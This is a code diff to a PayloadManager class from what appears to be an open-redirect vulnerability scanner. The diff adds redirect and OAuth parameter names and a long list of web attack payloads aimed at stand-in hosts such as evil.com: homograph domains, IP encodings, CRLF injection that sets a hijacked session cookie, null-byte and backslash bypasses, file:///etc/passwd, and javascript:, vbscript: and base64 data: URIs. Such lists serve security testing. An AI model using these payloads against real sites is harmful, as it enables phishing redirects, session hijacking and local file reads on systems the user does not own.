@@ -14,8 +14,9 @@ class PayloadManager:
         self.custom_payloads_file = custom_payloads_file
         self.small_mode = small_mode
         
-        # Common redirect parameters (extended list)
+        # Common redirect parameters (extended list including real-world scenarios)
         self.all_redirect_params = [
+            # Basic redirect parameters
             'url', 'redirect', 'return', 'returnurl', 'return_url',
             'next', 'goto', 'target', 'destination', 'dest',
             'continue', 'forward', 'location', 'site', 'to',
@@ -23,7 +24,44 @@ class PayloadManager:
             'redirectUrl', 'returnUrl', 'nextUrl', 'targetUrl',
             'r', 'u', 'link', 'path', 'page', 'ref', 'referer',
             'exit', 'out', 'away', 'external', 'redir',
-            'redirect_to', 'forward_to', 'go_to', 'jump_to'
+            'redirect_to', 'forward_to', 'go_to', 'jump_to',
+            
+            # OAuth and SSO parameters
+            'redirect_uri', 'response_type', 'state', 'RelayState',
+            'returnTo', 'return_to', 'returnURL', 'return_URL',
+            'SAMLRequest', 'SAMLResponse', 'idp_return_to',
+            
+            # Enterprise application parameters
+            'returnTo', 'back_to', 'continue_to', 'success_redirect',
+            'error_redirect', 'cancel_url', 'return_path', 'next_page',
+            'landing_page', 'home_url', 'dashboard_url', 'profile_url',
+            
+            # Payment and e-commerce parameters
+            'success_url', 'cancel_url', 'return_url', 'notify_url',
+            'callback_url', 'ipn_url', 'webhook_url', 'confirmation_url',
+            
+            # Email and notification parameters
+            'confirm_url', 'verify_url', 'activation_url', 'reset_url',
+            'unsubscribe_url', 'click_url', 'track_url',
+            
+            # File and upload parameters
+            'upload_success', 'download_url', 'file_url', 'next_url',
+            'continue_url', 'finish_url', 'complete_url',
+            
+            # Form and submission parameters
+            'submit_redirect', 'form_redirect', 'post_redirect',
+            'action_redirect', 'handler_redirect', 'processor_redirect',
+            
+            # API and service parameters
+            'api_redirect', 'service_url', 'endpoint_url', 'webhook',
+            'post_back', 'ping_back', 'notify', 'alert_url',
+            
+            # Mobile and app parameters
+            'app_redirect', 'mobile_redirect', 'deep_link', 'universal_link',
+            'custom_scheme', 'intent_url', 'fallback_url',
+            
+            # Specialized parameters
+            'first', 'second', 'third', 'chain', 'hop', 'intermediate'
         ]
         
         # Small mode uses only most common parameters
@@ -123,6 +161,9 @@ class PayloadManager:
             "http://legitimate-site.com.evil.com",
             "http://evil.com@legitimate-site.com",
             "http://legitimate-site.com@evil.com",
+            "http://legitapp.com.evil.com",
+            "http://evil.com/legitapp.com",
+            "http://legitapp.com@evil.com",
             
             # IP address variations
             "http://127.0.0.1",
@@ -130,43 +171,113 @@ class PayloadManager:
             "http://192.168.1.1",
             "http://10.0.0.1",
             "http://172.16.0.1",
+            "http://localhost",
             
             # Octal/Hex IP bypasses
             "http://0177.0.0.1",  # 127 in octal
             "http://0x7f.0.0.1",   # 127 in hex
             "http://2130706433",   # 127.0.0.1 as decimal
+            "http://017700000001", # Full octal
+            "http://0x7f000001",   # Full hex
             
             # Unicode domain bypasses
             "http://еvil.com",  # Cyrillic 'e'
             "http://evil.соm",  # Cyrillic 'o'
+            "http://еvіl.com",  # Mixed Cyrillic
+            "http://evi1.com",  # Number substitution
             
             # IDN homograph attacks
             "http://еvil.com",  # Mixed scripts
             "http://gооgle.com", # Double 'o' with Cyrillic
+            "http://аpple.com",  # Cyrillic 'a'
+            "http://microsоft.com", # Cyrillic 'o'
             
             # Port confusion
             "http://evil.com:80",
             "https://evil.com:443",
             "http://evil.com:8080",
+            "http://evil.com:3000",
+            "http://evil.com:5000",
             
             # Whitespace bypasses
             "http://evil.com ",
             " http://evil.com",
             "http://evil.com\t",
             "http://evil.com\r\n",
+            "http://evil.com\n",
+            "\thttp://evil.com",
             
             # Case sensitivity bypasses
             "HTTP://EVIL.COM",
             "Http://Evil.Com",
             "hTTp://eViL.cOm",
+            "HTTPS://EVIL.COM",
+            "Http://EVIL.com",
             
             # Fragment bypasses
             "http://evil.com#legitimate-site.com",
             "http://evil.com/#/legitimate-site.com",
+            "http://evil.com#legitapp.com",
+            "http://evil.com/?#legitapp.com",
             
             # Query parameter confusion
             "http://evil.com?legitimate-site.com",
             "http://evil.com?redirect=legitimate-site.com",
+            "http://evil.com?legitapp.com",
+            "http://evil.com?host=legitapp.com",
+            
+            # CRLF injection payloads
+            "http://evil.com%0d%0aSet-Cookie: session=hijacked",
+            "http://evil.com%0a%0dLocation: http://evil.com",
+            "http://evil.com\r\nLocation: http://attacker.com",
+            
+            # Null byte injection
+            "http://evil.com%00.legitapp.com",
+            "http://legitapp.com%00.evil.com",
+            "http://evil.com\x00legitapp.com",
+            
+            # Backslash bypasses
+            "http:\\\\evil.com",
+            "http:\\/\\/evil.com", 
+            "http:/\\evil.com",
+            "\\\\evil.com",
+            "\\/\\/evil.com",
+            
+            # OAuth specific bypasses
+            "http://legitapp.com.evil.com/oauth/callback",
+            "http://evil.com/oauth/callback?host=legitapp.com",
+            "http://evil.com/legitapp.com/oauth/callback",
+            
+            # Enterprise app bypasses
+            "//evil.com/dashboard",
+            "///evil.com/grafana",
+            "http://evil.com/api/v1/callback",
+            "https://evil.com/admin/login",
+            
+            # Mobile and deep link bypasses  
+            "evil-app://redirect?url=http://evil.com",
+            "http://evil.com/mobile/redirect",
+            "intent://evil.com#Intent;scheme=http;end",
+            
+            # File protocol bypasses
+            "file:///etc/passwd",
+            "file://evil.com/etc/passwd",
+            "file:///c:/windows/system32/",
+            
+            # Data protocol bypasses
+            "data:text/html,<script>location='http://evil.com'</script>",
+            "data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cDovL2V2aWwuY29tJzwvc2NyaXB0Pg==",
+            
+            # JavaScript protocol variations
+            "javascript:window.location='http://evil.com'",
+            "javascript:location.href='http://evil.com'", 
+            "javascript:document.location='http://evil.com'",
+            "javascript:window.open('http://evil.com')",
+            "javascript://evil.com/%0Alocation.href='http://evil.com'",
+            
+            # VBScript (legacy IE)
+            "vbscript:window.location='http://evil.com'",
+            "vbscript:location.href='http://evil.com'",
         ]
         
         return advanced_payloads
